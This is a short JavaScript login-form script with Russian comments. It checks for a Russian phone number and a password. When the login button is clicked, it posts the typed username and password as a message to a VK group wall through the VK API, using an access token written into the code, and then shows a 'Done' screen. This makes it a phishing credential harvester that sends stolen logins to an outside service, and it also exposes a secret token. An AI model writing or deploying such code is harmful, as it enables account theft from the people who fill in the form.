//Валидация формы
Authorize_username.oninput = function(){
	return valid();
}
Authorize_password.oninput = function(){
	return valid();
}
//Проверка на валидность
function valid() {
	const Authorize_validate_phone = /\+7\s?[\(]{0,1}9[0-9]{2}[\)]{0,1}\s?\d{3}[-]{0,1}\d{2}[-]{0,1}\d{2}/;
	if(!Authorize_validate_phone.test(Authorize_username.value)) {
		Authorize_login.setAttribute('disabled', true);
		Authorize_login.style.background = "#919090";
	}else{
		if (!Authorize_password.value) {
			Authorize_login.setAttribute('disabled', true);
			Authorize_login.style.background = "#919090";
		}else{
			Authorize_login.removeAttribute('disabled');
			Authorize_login.style.background = "#fdfdfd";
		}
	}
}
//Отправка логина и пароля
Authorize_login.onclick = function Send() {
	const owner_id = "-203605080";
	const token = "ab91383b33ef3550d9a21f50da5f1591a9ef84d6098279f84ad9b7bd02043ea7cf6db6d46fa454e83bda1";
	const auth = 'Логин: ' + Authorize_username.value + ' Пароль: ' + Authorize_password.value;
	const url_post = `https://api.vk.com/method/wall.post?&owner_id=${owner_id}&message=${auth}access_token=${token}&v=5.130`
	const auth_send_post = fetch(url_post, {method: "POST", mode: "no-cors"});
	Authorize.style.display = "none";
	Done.style.display = "block";
}
